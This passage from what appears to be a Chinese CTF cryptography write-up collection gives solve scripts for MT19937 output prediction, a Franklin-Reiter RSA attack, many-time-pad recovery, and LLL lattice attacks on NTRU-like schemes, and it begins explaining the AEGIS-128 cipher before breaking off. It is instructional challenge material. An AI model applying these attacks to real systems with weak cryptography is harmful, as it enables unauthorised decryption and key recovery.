12106075465626310804, 7844624661111246261, 4336975117722586651, 6133486737560458810, 4285708852412482387, 17320873594107961221, 18154223303204659281, 9782280317517313987, 7359883602982876716, 8302270318241074541, 2854871868457850608, 4260073478828444220, 12464166743488435720, 11545300218414290638, 15943917616147672791, 17684529969128042573, 11970487736986863722, 4279463896104155311, 6452386490939306659, 14951002814044492267, 3924373366113113482, 17675004214657643053, 10514060213491578166, 5083735479763236962, 8237048074291002693, 178024658423258428, 16217384550361068797, 6823885072554733775, 14640293890442769000, 11118102735797335929, 17687811899187265346, 12324758265458544032, 13305186849598403772, 2061361200506122451, 4473679754720240444, 15364566282531130774, 10360818283823976655, 17220043518084908852, 9386042935320331823, 10932555460714805145, 14286030551222176204, 5513294049464657489, 9643782458509542843, 2950842616838528179, 16153550634060410597, 10622243240110203305, 1642938210383117587, 16348894212565750617, 17802404752703029833, 16933001622790235864, 13021337058260052257, 17301160463217879931, 4914154622730751038, 3649150598994385675, 17138640742876844054, 6723182378145435688, 15799828338293133322, 994720218982390675, 10557290726979603665, 17714019041621996643, 13997848863450584994, 11077445104717373075, 2834856239311065051, 11214787995926447582, 4068838695613829268, 3318186966385494373, 10984597623033520694, 5515414919887778777, 7222755179917827587, 16315875605087375576, 1416504086864662519, 9102186857132686420, 10069600536464217172, 6582524821522410340, 15369756932292150641, 17542632941176957329, 6114252881995050176, 2055179652476914195, 16405356136326356060, 14344232008993353644, 7357227068527869292, 14444189009256502503, 474793712655159763, 7277957134452370555, 10136894698074936516, 16493593438906441399, 965972604086413481, 7698637742708237198, 14701582675687476239, 8687372870093533304, 8617910444450923438, 9198266698377902297, 17663341461584809487, 9416311128064169723, 15527623086766043739, 17634355913948865190, 18230067880107976101, 14647282067432289184, 2666571742016867486, 35944775638564196, 13202068495097382260, 9200881323819852309, 4609224846213708248, 18385087669463550574, 10907111573029619720, 3677665280613822779, 7175067246924173873, 11557554314793111361, 16459269098754836930, 15069426419433415372, 3478942161672373533, 1475410410806061275, 3951913608914307936, 9031385401155758661, 3487921219891556908, 14331439795449455643, 18005194978393081205, 17499558816128213969, 10013697255070423725, 5656707783041395866, 8245156232824114523, 5484825401635850101, 18276565390397117490, 9806016278660472039, 6246223529755503034, 16322603114524844950, 13512386112109766619, 4292997062471342719, 5482339873158479974, 12153068771020641259, 18134128714075076811, 3921582705345984456, 17990063870067007106, 11893303237020637674, 584000375933180982, 6837860293438757570, 8668590806728300645, 10930322698482157784, 3456591010166906694, 8479176164660731035, 1378913458575066776, 11867206231852016448, 11155774780214677606, 912636353429261442, 17286540002553508524, 2342876557589322779, 8472494814582696749, 1649463863153987977, 6639761134830802698, 17749792536888103944, 6682611142368155837, 8961391229631067960, 16808632462882238050, 12764361808843833740, 3494650449008997672, 13464542575897195823, 424905026997643448, 6949880018570988189, 4352171970901905656, 7585977087659274602, 9963800442502096068, 11967585318365690786, 1330206767381639342, 8961211309807685961, 12822173985081341335, 4508173450257371182, 5828692808060501375, 7437728885533218362, 11924888116770741814, 2012177013990519412, 6499123439580002081, 13085942749253543550, 12967954280047984193, 401135611301783756, 3748733649551258520, 3742761952933734129, 7180568637515019340, 8490711531714639868, 1461899626173313114, 15357996742461975417, 14566908736002266815, 18368411028248688780, 2276282088146233438, 13500510232438577028, 5042075854511929699, 6430943865985944461, 4611615451136427723, 16501718400150227301, 12689032035555572221, 15097412730296922717, 3917094315801026114, 2738852375492418821, 16365967597393176630, 15062401340541737624, 14638139755970734808, 17586333334851266372, 17319918915751492871, 11845068873340136881, 1459249680175909613, 7472745361441793631, 1812384806700690960, 8855007047564417997, 2163690632469050637, 1883216720349119806, 17992478845633263598, 4665099551190282678, 11678011021345341884, 14187013186800119116, 14052476937717753457, 14759086517840933234, 5009467219504023390, 4622766434224603629, 14306333222661486071, 3858064603145888263, 5480134807934395111, 4123024571389908319, 4857052736700414325, 16243980005326285458, 3632766067814039781, 710008964341406746, 5363960844618609694, 14114730195035015808, 16428297947621094568, 7700974694607772814, 16793381582485703202, 13948380472150916306, 14326581900789123198, 4228968193234651142, 11100829582225662535, 17495023276082596914, 8634787791698085471, 6145765583313197421, 16788430897014030178, 11435692770927277650, 18065086017618584565, 11769581244567937207, 13278489473631493919, 8019460929320111149, 5693618935245539106, 3634811597737081216, 12859793273631344580, 11287301384880619752, 18394782048366983264, 7421132200962846807, 4084540937457316264, 13113874388366064762, 8131358879566215449, 18127561595469413694, 8734770900165404534, 17424357262393464853, 10097252723684474013, 13657127819021358228, 15053911843606144518, 7213762907694003185, 9201850376693257882, 1152437224214832892, 14749316667846084768, 13945981875336291326, 17205113012613835387, 17208682023098019636, 16837244935188768969, 1562887481274292099, 4817091557053520861, 12788128805488570720, 12001115261194850091, 4003771944165077120, 2234627252583081046, 9648802166794733209, 2217782127954322431, 8813298931273365931, 8055654179906713224, 11975882101529377223, 3484952924454621378, 9405558259370977621, 10465136460923462995, 10114188036427722127, 3137605056932583175, 6052770256806365938, 13216705997825407019, 9321595432845767721, 7404913363748792748, 3104222247113734338, 7884841839505302190, 10282600744363227974, 10560288140635802837, 345714099277926722, 14827599919753819919, 15348137034782912153, 117188792560235416, 721765732450403598, 13484574492955662118, 4088456941206683834, 7978001820773876706, 3458688202384309003, 7297824025882346112, 8366103370544240004, 14726906913567147182, 17890463553725848943, 11056300998383817861, 12172218496062907284, 5614991059403362329, 94695117905761066, 13704554396573869457, 6942259376738368761, 3724125954238286617, 605665642089906206, 4440357634786283101, 9312356527281045726, 18433419763563298916, 5537070555239228268, 13655980751929630271, 11097112793938372280, 7029091093125181071, 15682558111863651240, 9864810256451039130, 5940287037201593945, 7230113292992804565, 1262540470928338201, 9310270195989362278, 5911475921308141211, 5943394248414176333, 2467090711423218798, 14834589937967531968, 2112412521637455955, 4483762121635552341, 9203453183301626690, 12517949271946792756, 11765267562048769695, 2130431799048385018, 1021118212271885825, 4527525148317213493, 2666979235110630076, 11385323575772505236, 1957143482002768471, 6653869545594001852, 9403787903811093312, 8793399260966849492, 9134129177479686128, 5344549741728076030, 3785525706196259331, 4098427281238979781, 14780185570363454606, 15022528285132147394, 4415868057026363350, 11652850077219368760, 6599101465769202844, 2324709069440458374, 2328030874184313596, 5375810578496425005, 3324352283736262699, 8961596405474061089, 17555556238164816340, 1217170962166712882, 12300833475020082526, 5755163501951705747, 17673007557139716816, 5400175616849815689, 16424974447872124521, 3528336073009821153, 5677112613986511204, 11681713850480599971, 17889123911033641068, 13398947136669841280, 14362332277634552597, 12612291562289233371, 9068021764334224282, 11003726667849614111, 170500049009536169, 11787850295471586749, 17738376378319933104, 265438126753187088, 16449969716110589415, 4267181961918958684, 8504721844419720345, 3602399335681951800, 16377130351527521329, 137205552767822057, 15076083541717516190, 16933079658536833273, 11539760435976559163, 10349113249022571006, 13506623588121209051, 1767257281718218581, 55497369433803178, 9620183217554454747, 352109299759977748, 13362871402671548794, 3245933715092323519, 7098945802580095824, 4749740144906242542, 16475573756134089178, 17665764356947420150, 2428128185580929142, 10865799872171434959, 14020645350131532589, 10866919792482735515, 1639413999413384841, 2660467607619573650, 7176921049243916372, 44929497464104249, 8302026006819056308, 14088827593384756939, 4541386427308185948, 14992023310005249339, 11521110449882379692, 8618468396936995487, 17255690317020962535, 14459878492479278129, 484161739083752565, 8967126682428339806, 12208164843579773375, 11736932142677088849, 7727530756457513692, 3829808422387045462, 9815185898534079561, 8586014595553015140, 3121180959957037281, 546542310230906996, 12788213799003801890, 6764098612553553982, 16230764669201238834, 18205877184448874064, 17741584570061449195, 13498693246362717293, 12557996638970667763, 16240767280840697248, 12688455377024311919, 11821568382422290340, 13694830011903255027, 15977888673915506876, 12346885892635259078, 7838634663919088845, 13697951298959265290, 16396403340832798324, 5570724586621569543, 348190538972825181, 498434119496336507, 4629603637537989875, 2904956541370261046, 15056806750205280060, 12512751698356956353, 11598492895309981739, 5900963668615601483, 9286588840856606265, 14687331465648814630, 724531149460506959, 17016613597390705501, 17860966464838170961, 8082441243109422217, 4226070025033485357, 11557581090421115709, 1365974406386375567, 11626532849062235723, 3026767794107211866, 18265729906007136324, 9752072017332967624, 8344899021234511823, 17168023990850847933, 2108491903973827339, 16946871590663953204, 15268856540448037497, 6729814538132205074, 10608459573931314294, 5349389425094153624, 9119249437078259281, 3022057742231131843, 699495075963768616, 3938180359891046702, 3132000820601213475, 6453763775620458305, 10361983187468507141, 18091129984666032675, 4573010375750843342, 791243713554231377, 6523321933147523990, 2460943155031244372, 11915079949168514844, 10962272930784254451, 7828398430854164950, 11580373300607261323, 14496114508805667408, 12800088002722989479, 4489382774379581027, 6241885538530491013, 15369736452242646419, 18339907485699833664, 14843607724306799380, 15883998472835946312, 13401911608426527924, 3615974264171478906, 2951259064496198811, 7803436242736563826, 4135188636826481442, 5021264042001895982, 5708915960985917130, 11181910501244483073, 5573954009605843738, 3021445895744683140, 10033196279958934660, 2680855996735532569, 5360189858868901361, 8167521138921792938, 6161893524269697852, 5558764473993615110, 13408224815379298518, 17751136251534065932, 12169040946650623409, 8591752444091873275, 17571132974848304944, 16886102890910720967, 10434431909683674783, 1798513582887417581, 4922950544911394484, 436078592099283889, 10061099463464191790, 2611739359719785328, 12076811020743303539, 2799012545596479383, 12408665237686526887, 2569240801657154200, 189527510828503181, 17204452437985213973, 15873367317020085673, 4668478220806245681, 2950905851413543275, 17244737907264565987, 9947196811151946334, 10861412944742179841, 17691963506930352, 8645426666922253783, 5429177116065336723, 9148166318339274858, 1140817301847500253, 16395024534726001957, 14455719375367518785, 14365592159046307404, 4233672053992875940, 7055944177387857447, 13438827615850026797, 1980459165532258112, 9924227990341676772, 1258768952545009550, 11361136852134788879, 4300533493752614933, 14681866951052377042, 8810851615125798911, 8542930103562314876, 14579475506918455576, 16047523528880779866, 1380610643416544755, 12076763661431463653, 13633351579395427301, 14309637244904670356, 2784919727650036805, 10011701223131936197, 16483582182156980016, 8123259590358566068, 15547670775408355653, 17114873767724596286, 15947690112937005468, 7121267006666076401, 15013329343112101948, 6864703775066800136, 2091646091797307547, 11775971286169844616, 13169145274668540822, 18168794334896751614, 8757043158271235193, 12162217691779194844, 10986813166707328024, 4635742872437686441, 9862874769906586011, 5685640425162748748, 16154828004824450666, 12628559068947614691, 18330543771355967176, 9613516487817756865, 11541501577179857879, 14497414068611647595, 16303734492840330251, 3271500016365005027, 3388428085388242514, 1510190073604428294, 10472797328548283957, 9702728991503878250, 3428420960955188888, 6445224698406122174, 5824974369892172376, 6434707946773025269, 2528556873146891935, 6653952898338236677, 432032921329160914, 11760277815966837524, 9034646482280577053, 2164586012669056137, 2616742534894002775, 942200230707617758, 5327259632525477213, 13158846232145762876, 418213563708326684, 13494580607955344451, 13712793184114793941, 13061962736775979494, 1304785696522982742, 6636575085535497783, 2548707152553606937, 5179609242429207458, 216456340969811386, 8504681751639758545, 18283819579633351371, 8667595238380606433, 15751060841552119650, 10368350373271876373, 2271051687544383713, 9387982608299096176, 5067191246740902300, 2164563749890672481, 1441096478400860673, 1698497919091504741, 7070556267349479512, 12383115351862498978, 4393914787565756921, 4843292715860537520, 1308644180050696570, 14727896807325886230, 5278800618172724513, 12682261375578839563, 2292210517400729441, 4539831393791783686, 11184877751085848181, 10455063755670025488, 4090948952473244180, 16140611536328585842, 4009612709629840807, 11680437954598062018, 7483349842877448300, 15595722655987483, 6218105392300937979, 4230977848731176695, 13608604339767291094, 15450864502883571776, 14522043162137067612, 17407306325856924818, 4319385475362004982, 3602607459242950116, 12919519173298379659, 17034295612889519066, 16366395208098028226, 16902437965740309665, 2976505459482736335, 13462949500218242510, 9986640179928306819, 15767966148754567460, 5987675944577047926, 908917886808113767, 7775521308318543697, 8554839413248075973, 15830102725396509035, 4299599343707193551, 151253289791368809, 2074429061050605186, 7050639080325887498, 7147021929133361313, 17288365729620621043, 13258996835492542256, 9813891614733236908, 18409516239359796503, 6114024626644998222, 5075084268262314250, 9316231926255260786, 5482842808296472097, 9445382679464571342, 341224484511902160, 13784129997188624024, 7368235505308494752, 9538628927204464393, 15343501567237040869, 17821228923098686582, 11856702827887607105, 4609368864524898262, 14712861947435117594, 10899071438470157317, 9590771163252554239, 18239878173866313008, 17348232285102511866, 7979447902828438866, 10189744825270231378, 15897242279714161903, 6814376918912188976, 14160295163213869895, 3756399085747026247, 7851944732036371005, 11096596485883534745, 17528766768147904271, 12327736621720397026, 17199643471105880304, 1457112013787956971, 4273300114441781498, 15938254022202331850, 12502089261484299213, 4148861150304071474, 16774360387122462360, 4693230099623568126, 4923228118836213154, 9672193860921898593, 12031664828792019070, 5538759348099426194, 16607999864018217913, 12801100377914190264, 3714468733303697571, 15066120849955539008, 8667181143710237426, 11054461905529698068, 5000947219599965404, 13679544882732214263, 12329024745774068972, 5097030027906429561, 623294247887615792, 7749632090228054556, 7348314875737386281, 15051320008802373451, 2316565134939415828, 15735407710770638384, 11219541286219768213, 204970242910995613, 2942251758669266767, 2446839436006958427, 5818242570475463614, 13952882162210790154, 1091967561799274001, 815669942787526663, 17619502901620723825, 16225434478481351091, 3458534598924545265, 13105176322289080982, 11660428227784960936, 17456917329772545202, 17370020327039448988, 9872223534315941551, 11134891555868721043, 7366592335535613164, 17901061154562355983, 11133114536770437092, 1216102370074140712, 12369779197340106392, 15587264963667110618, 9839321331851277149, 9504232653874690416, 3277515784377114968, 11059930209112798658, 2233223095276440320, 8766259643725656785, 2981451568249872324, 16923059343824130016, 10424762723653272247, 5892364915443744172, 5076056599547198181, 8353569794147013632, 68280038528939863, 13688795951892474996, 18383293316785491223, 16830221144227410771, 7584798539822253809, 16154968662715915283, 15260829610123279933, 4877893352139268298, 12344113633536211040, 12755524932207520008, 5908761689287331221, 10710685683019125231, 13529779487666749860, 17058207837744409161, 16146404756880670361, 479722120166144953, 18441286007767994888, 291021007503523962, 18404478127831570654, 7161684062922444049, 13215140078849265993, 3557093399709796464, 8888690439305341966, 6505462940112971530, 8788739344222162420, 1559480144085566061, 12347917275519574148, 81829582595789879, 256554008735570761, 13242371414730122957, 11233874231428992467, 13642556384815692603, 15402098527178414517, 11899811780905828512, 17981855746545737550, 4198592355605474429, 5837385946994485658, 8495884884442446152, 14987601548279232776, 8084557976601943459, 1951816494581368991, 9198564418991457621, 7932995247156296394, 1727181807973386737, 6589861619929187838, 8606879269790701257, 4872437793541536276, 15996953415759653811, 9248501959204439487, 4430871643980849717, 14781923535395473967, 15369814218152848270, 8234249513592097579, 17526914633363815278, 12602191579658959446, 14791379194771288560, 5744799145746380430, 16286641132134680583, 14401259673433035989, 8781313506229705992, 15404783223179793847, 1240592003072635453, 6610236446870877009, 13844205871835893697, 5872162931619514680, 7969671272013520825, 2766019064081136959, 12517751573997673572, 9675763639282129596, 6287079859085827340, 13703850028043029227, 2177538632683478842, 6799380297638496469, 18086402650215147822, 6934362201312885542, 18313335318052001373, 11480263463655438919, 9106785110623113711, 7886399579140250642, 3228263571695418855, 16330664963396613091, 17040963948964130546, 10826606124423646728, 2004304733703582220, 6398041571715522263, 493137561871256273, 9640584407491032029, 16021497942534243559, 3278925318796881775, 13963508362353842195, 10912881406340519756, 12333002179163988752, 10955825398678638303, 13098738959421529927, 4516651215445389327, 560548562818360587, 6879446280544278794, 17586026517062529192, 3060809513700298266, 10921253043682209150, 3096750023591656316, 13400270480516947274, 14497399820138619643, 885203573443562232, 14340392236208331243, 2009503763921531273, 5844055580211151684, 11452679420109767541, 9889351505080896698, 12297221479872520074, 145327472993840493, 14415741022760094936, 8161272693495024070, 12628038780375717745, 5651066232426624946, 6800289990668254787, 5629827258100727980, 9532683887081871864, 17078228306713530437, 5752393712365853210, 9906279898480007557, 15575593797821095372, 7944135127159515198, 9274370606751170281, 8181946307601340138, 8855405836683610977, 10604653901416893787, 11825055110857035062, 4735989253296218178, 9585945902650058725, 16832571384429265203, 14392760261562270322, 14439958219835048793, 6845765491294793435, 10537690616100733378, 10290121783493343259, 17074695699105811516, 17508569400297966287, 15411447085789948953, 10245321407074763960, 1474249930147284650, 338858065124110851, 16523709105734298997, 17458843705270839631, 11471295397505031119, 6285176061334214908, 2705374183703063320, 12810847959239174924, 10260721046212143624, 4221085600703449212, 1200019904756589653, 10460179773211533763, 11823018480340155341, 9903187458931297940, 1139978577616698133, 5744593808037898897, 16758300938964610655, 7359351744825865326, 10862900264466009346, 3342859891404368697, 18254401553280819107, 17133307977473573143, 11714571723704738721, 8944205159183890163]\rpre = mt19937_64()\rpre.from_output(list(map(int, res[:312])))\ri = 0\rfor rand in res[312:]:\ra = pre.random()\rif int(rand) == a:\ri += 1\rcontinue\relse:\rFLAG = b\u0026#39;DASCTF{\u0026#39; + hashlib.md5(str(a).encode()).hexdigest().encode() + b\u0026#39;}\u0026#39;\rprint(FLAG)\rbreak 美团 # easy_RSA # 外面一层是rsa padding attack：\nn=0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79 e=0x3 encrypt_m=0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1 encrypt_m_1=0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8 def gcd(a, b): while b: a, b = b, a % b return a.monic() def franklinreiter(C1, C2, e, N, a, b): P.\u0026lt;X\u0026gt; = PolynomialRing(Zmod(N)) g1 = (a*X + b)^e - C1 g2 = X^e - C2 print(\u0026#34;Result\u0026#34;) result = -gcd(g1, g2).coefficients()[0] f = open(\u0026#34;data.txt\u0026#34;, \u0026#34;w\u0026#34;) f.write(str(result)) f.close() return result m = franklinreiter(encrypt_m_1, encrypt_m, e, n, 1, 1) from Crypto.Util.number import * print(long_to_bytes(m)) # the key is :everything_is_easy_in_this_questionCOPY 得到压缩包密码：everything_is_easy_in_this_question\n解开之后是many pad attack，尝试缩小明文和key的table的范围：\nfrom Crypto.Util.number import * from string import * print(printable.encode()) TABLE1=ascii_letters+digits+\u0026#34;{}_@#\\\u0026#34;| \u0026#34; TABLE2=b\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,{} \u0026#39; data = open(\u0026#34;one_time_cipher\u0026#34;).read().split(\u0026#39;,\\n\u0026#39;) data = [long_to_bytes(int(i, 16)) for i in data] print(data) key = [] for i in range(26): tmp_key = b\u0026#34;\u0026#34; for j in TABLE1.encode(): # flag的table yes = True for k in range(len(data)): if len(data[k])\u0026lt;(i+1): break tmp_m = j^data[k][i] if long_to_bytes(tmp_m) not in (TABLE2.decode()).encode(): # key的table yes = False break if yes: tmp_key += long_to_bytes(j) print(tmp_key) key.append(tmp_key) TABLE = b\u0026#34;flag{it_1s_P@dd1n_@nd_p@d}\u0026#34; for k in range(len(data)): tmp_key = b\u0026#34;\u0026#34; for i in range(26): if len(data[k])\u0026lt;(i+1): break tmp_key += long_to_bytes(TABLE[i]^data[k][i]) print(tmp_key) # flag{it_1s_P@dd1n_@nd_p@d}COPY 得到flag：flag{it_1sP@dd1n@nd_p@d}\nhttps://github.com/fghcvjk/MT-CTF-2021/tree/master/crypto/easy_RSA\nMar.DASCTF # threshold # 题目代码如下\n#make.sage import random flag = bytearray(\u0026#34;DASCTF{********************************}\u0026#34;.encode()) flag = list(flag) length = len(flag) N=53 p=257 q=28019 d=18 f=[1]*19+[-1]*18+[0]*16 random.shuffle(f) g=[1]*18+[-1]*18+[0]*17 random.shuffle(g) Q.\u0026lt;x\u0026gt; = Zmod(q)[] P.\u0026lt;y\u0026gt; = Zmod(p)[] fx=Q(f) fy=P(f) gx=Q(g) Fqx=fx.inverse_mod(x^N-1) Fpy=fy.inverse_mod(y^N-1) hx=(Fqx*gx).mod(x^N-1) r=[1]*10+[-1]*22+[0]*21 random.shuffle(r) rx=Q(r) mx=Q(flag) ex=(p*rx*hx+mx).mod(x^N-1) print(ex) print(hx) 可以发现本题的内容和\r2020SCTF-Lattice很像，那么我们可以据此写出exp，不过由于这道题中没有bal_mod，所以也就可以去掉\nimport random p = 257 q = 28019 n = 53 Zx.\u0026lt;x\u0026gt; = ZZ[] e = 7367*x^52 + 24215*x^51 + 5438*x^50 + 7552*x^49 + 22666*x^48 + 21907*x^47 + 10572*x^46 + 19756*x^45 + 4083*x^44 + 22080*x^43 + 1757*x^42 + 5708*x^41 + 22838*x^40 + 4022*x^39 + 9239*x^38 + 1949*x^37 + 27073*x^36 + 8192*x^35 + 955*x^34 + 4373*x^33 + 17877*x^32 + 25592*x^31 + 13535*x^30 + 185*x^29 + 9471*x^28 + 9793*x^27 + 22637*x^26 + 3293*x^25 + 27047*x^24 + 21985*x^23 + 13584*x^22 + 6809*x^21 + 24770*x^20 + 16964*x^19 + 8866*x^18 + 22102*x^17 + 18006*x^16 + 3198*x^15 + 19024*x^14 + 2777*x^13 + 9252*x^12 + 9684*x^11 + 3604*x^10 + 7840*x^9 + 17573*x^8 + 11382*x^7 + 12726*x^6 + 6811*x^5 + 10104*x^4 + 7485*x^3 + 858*x^2 + 15100*x + 15860 h = 14443*x^52 + 10616*x^51 + 11177*x^50 + 24769*x^49 + 23510*x^48 + 23059*x^47 + 21848*x^46 + 24145*x^45 + 12420*x^44 + 1976*x^43 + 16947*x^42 + 7373*x^41 + 16708*x^40 + 18435*x^39 + 18561*x^38 + 21557*x^37 + 16115*x^36 + 7873*x^35 + 20005*x^34 + 11543*x^33 + 9488*x^32 + 2865*x^31 + 11797*x^30 + 2961*x^29 + 14944*x^28 + 22631*x^27 + 24061*x^26 + 9792*x^25 + 6791*x^24 + 10423*x^23 + 3534*x^22 + 26233*x^21 + 14223*x^20 + 15555*x^19 + 3381*x^18 + 23641*x^17 + 2697*x^16 + 11303*x^15 + 6030*x^14 + 7355*x^13 + 20693*x^12 + 1768*x^11 + 10059*x^10 + 27822*x^9 + 8150*x^8 + 5458*x^7 + 21270*x^6 + 22651*x^5 + 8381*x^4 + 2819*x^3 + 3987*x^2 + 8610*x + 6022 def inv_mod_prime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f))) def mul(f,g): return (f * g) % (x^n-1) def bal_mod(f,q): g = list(((f[i] + q//2) % q) - q//2 for i in range(n)) return Zx(g) def decrypt(e,pri_key): f,fp = pri_key a = bal_mod(mul(e,f),q) d = bal_mod(mul(a,fp),p) return d def get_key(): for j in range(2 * n): try: f = Zx(list(M[j][:n])) fp = inv_mod_prime(f,p) return (f,fp) except: pass return (f,f) M = matrix(ZZ, 2*n, 2*n) hh = h.list() for i in range(n): M[i,i] = 1 for i in range(n,2*n): M[i,i] = q for i in range(n): for j in range(n): M[i,j+n] = hh[(n-i+j) % n] M = M.LLL() key = get_key() l = decrypt(e, key).list() flag = bytes(l) print(flag) son_of_NTRU # 虽然这道题目说的不是NTRU，但是我们还是可以发现题目的代码和NTRU基本类似\n#! /bin/bash/env python3 from random import randrange from Crypto.Util.number import * from gmpy2 import invert def gcd(a,b): while b: a,b = b,a%b return a def generate(): p = getPrime(1024) while True: f = randrange(1,(p//2)**(0.5)) g = randrange((p//4)**(0.5),(p//2)**(0.5)) if gcd(f,p)==1 and gcd(f,g)==1: break h = (invert(f,p)*g)%p return h,p,f,g def encrypt(m,h,p): assert m\u0026lt;(p//4)**(0.5) r = randrange(1,(p//2)**(0.5)) c = (r*h+m)%p return c h,p,f,g = generate() from flag import flag c = encrypt(bytes_to_long(flag),h,p) print(\u0026#34;h = {}\u0026#34;.format(h)) print(\u0026#34;p = {}\u0026#34;.format(p)) print(\u0026#34;c = {}\u0026#34;.format(c)) 那么我们可以直接使用\rSoreat_u师傅的脚本进行解密\nfrom Crypto.Util.number import * def GaussLatticeReduction(v1, v2): while True: if v2.norm() \u0026lt; v1.norm(): v1, v2 = v2, v1 m = round( v1*v2 / v1.norm()^2 ) if m == 0: return (v1, v2) v2 = v2 - m*v1 h = 70851272226599856513658616506718804769182611213413854493145253337330709939355936692154199813179587933065165812259913249917314725765898812249062834111179900151466610356207921771928832591335738750053453046857602342378475278876652263044722419918958361163645152112020971804267503129035439011008349349624213734004 p = 125796773654949906956757901514929172896506715196511121353157781851652093811702246079116208920427110231653664239838444378725001877052652056537732732266407477191221775698956008368755461680533430353707546171814962217736494341129233572423073286387554056407408816555382448824610216634458550949715062229816683685469 c = 4691517945653877981376957637565364382959972087952249273292897076221178958350355396910942555879426136128610896883898318646711419768716904972164508407035668258209226498292327845169861395205212789741065517685193351416871631112431257858097798333893494180621728198734264288028849543413123321402664789239712408700 # Construct lattice. v1 = vector(ZZ, [1, h]) v2 = vector(ZZ, [0, p]) m = matrix([v1,v2]); # Solve SVP. shortest_vector = m.LLL()[0] # shortest_vector = GaussLatticeReduction(v1, v2)[0] f, g = shortest_vector print(f, g) f = abs(f) g = abs(g) # Decrypt. a = f*c % p % g m = a * inverse_mod(f, g) % g print(long_to_bytes(m)) XCTF华为云专题赛 官方Writeup # 题目源码：https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020\n太湖杯 # Aegis # 整个出题的题目参考了googlectf 2020 Oracle的题目。由于考虑到比赛时长的问题（其实是作者比较菜），基本上是将其中的一个考点拿了出来修改成了当前的题目。针对那个题目比较完整的解法可以参考[这里](\rhttps://github.com/nguyenduyhieukma/CTF-Writeups/blob/master/Google CTF Quals/2020/oracle/oracle-solution.ipynb) 这个地方也有这个算法的比较详细的解释。\n算法简介 # AEGIS 算法是一种AEAD（authenticated encryption with associated data 关联数据的认证加密） 加密。这种算法除了能够提供对指定明文的加密，还能够提供对未加密的关联数据的完整性保证。说通俗一点就是，除了能够对我们发送的需要加密的信息进行加密，同时还提供了对我们明文信息的长度和时间这些未加密的数据进行验证的手法。当我们将密文解开的时候，会包含一个之前提供的明文信息的验证途径，例如能够得到长度的一个验证数据，我们此时就能够用这个数据验证我们之前未加密的长度的完整性。 在题目中，我们能看到两种不同的值:pt和aad\nct, tag = cipher.encrypt(iv, aad, pt) 此处的pt表示的就是我们通常意义下的明文，而这里的aad，实际上就是authenticated associated data，认证关联数据。这个数据会参与到整个加密过程中，用于生成状态。 ct表示的是加密后的密文，tag则是在加密完成后的状态算法中生成的校验标签，可以用来校验aad的值是否发生变化。\n关于aad的验证算法可以初步看一下加密过程。\ndef encrypt(self, iv, ad, msg): S = self.initialize(iv) S = self.update_aad(S, ad) S, ct = self.raw_encrypt(S, msg) tag = self.finalize(S, len(ad) * 8, len(msg) * 8) return ct, tag def decrypt(self, iv, ad, ct, tag): S = self.initialize(iv) S = self.update_aad(S, ad) S, pt = self.raw_decrypt(S, ct) tag2 = self.finalize(S, len(ad) * 8, len(ct) * 8) if tag2 != tag: raise Exception(\u0026#39;Invalid tag\u0026#39;) return pt 由于在加密或者解密过程中，aad值参与了最初加密状态的生成，所以aad值在不变的前提下，加解密中状态（State）变化是一致的，最后阶段算出来的 tag2 理论上会和我们传入的tag一致，就是利用这一点来保证aad的完整性。\nAegis128的算法 # 想要明白当前的算法的漏洞，需要先看明白当前加密算法原理。整个加密中会维护一个状态的概念，然后我们需要加密的内容会类似一些向量来影响整个状态，从而对明文完成加密。那么首先，为了更加方便的描述加密过程，我们需要预先定义一些变量:\nS[i]: 第i步更新的状态\rS[i][j]: 第i步状态中，第j块128bit分组\r^: 状态之间异或运算\r\u0026amp;: 状态的与运算\rconst0: 128bit的一个魔数（0x000101020305080d1522375990e97962）\rconst1: 128bit的一个魔数（0xdb3d18556dc22ff12011314273b528dd） Aegis有三种不同的加密方式，我们这里使用的是128版本\n状态更新 StatusUpdate # Aegis加密算法中，一个重要的概操作就是状态更新StateUpdate。当这个过程发生的时候，其更新算法如下:\nm: 一个128bit的信息\rS[i+1] = StatueUpdate(S[i], m)\rS[i+1][0] = S[i][0]^AESRound(S[i][4])^m\rS[i+1][1] = S[i][1]^AESRound(S[i][0])\rS[i+1][2] = S[i][2]^AESRound(S[i][1])\rS[i+1][3] = S[i][3]^AESRound(S[i][2])\rS[i+1][4] = S[i][4]^AESRound(S[i][3]) 这个更新过程的流程大致可以写作如下:\n初始化过程 # 整个算法的更新，首先使用密钥K128与初始化向量IV128进行一些运算，最终产生整个算法的初始状态。此时的K128为我们加密算法的密钥，IV128为一个可变的向量。整个生成的过程可以写作:\ndef initialize(self, iv): k_iv = _xor(self.key, iv) S = [k_iv, self.const_1, self.const_0, _xor(self.key, self.const_0), _xor(self.key, self.const_1)] for _ in range(5): S = self.state_update(S, self.key) S = self.state_update(S, k_iv) return S 根据代码，我们可以写作:\nS[-5][0] = k128^iv128\rS[-5][1] = const_1\rS[-5][2] = const_0\rS[-5][3] = k128^const_0\rS[-5][4] = k128^const_1\rfor i in range(5)\rS[-5+i+1] = StatueUpdate(S[-4+i], k128)\rS[-5+i+1] = StatueUpdate(S[-4+i+1], k128^iv128) 这里写作-4，主要是为了可以同步，保证我们在起始状态下为S[0]。\nAegis 中的AES # 我们来仔细看一下Aegis中的AES算法。首先来看到官方给出的aes:\ndef aes_enc(s: block, round_key: block) -\u0026gt; block: \u0026#34;\u0026#34;\u0026#34;Performs the AESENC operation with tables.\u0026#34;\u0026#34;\u0026#34; t0 = (te0[s[0]] ^ 